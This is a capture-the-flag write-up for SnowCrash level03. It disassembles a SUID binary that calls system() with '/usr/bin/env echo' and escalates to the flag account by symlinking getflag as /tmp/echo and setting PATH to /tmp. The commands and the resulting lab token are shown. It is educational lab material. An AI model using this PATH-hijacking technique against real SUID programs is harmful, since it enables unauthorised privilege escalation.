# Level03

In this level, we have an executable `level03`.  

```bash
level03@SnowCrash:~$ ls -la
...
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
...

level03@SnowCrash:~$ ./level03 
Exploit me
level03@SnowCrash:~$ ./level03 test
Exploit me
```

The bit `SUID` is set in this programm. So when it's execute, it is run as `flag03` instead of `level03`.  

Using `gdb` we can see the [code](./resources/main.c) assembly to understand it.  

```bash
0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
0x080484fe <+90>:	call   0x80483b0 <system@plt>
...
(gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"
```

As the binary will be executed as `flag03` we can try to launch the command `getflag` to obtain the flag.  
We can override `echo` builtin by an another.  
To do this we must:


1. Create symbolic link in a folder in which we have permissions : `/tmp`
2. Change the `PATH` env variable  


```bash
level03@SnowCrash:~$ ln -sf /bin/getflag /tmp/echo
level03@SnowCrash:~$ PATH="/tmp" ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password: 
level04@SnowCrash:~$
```
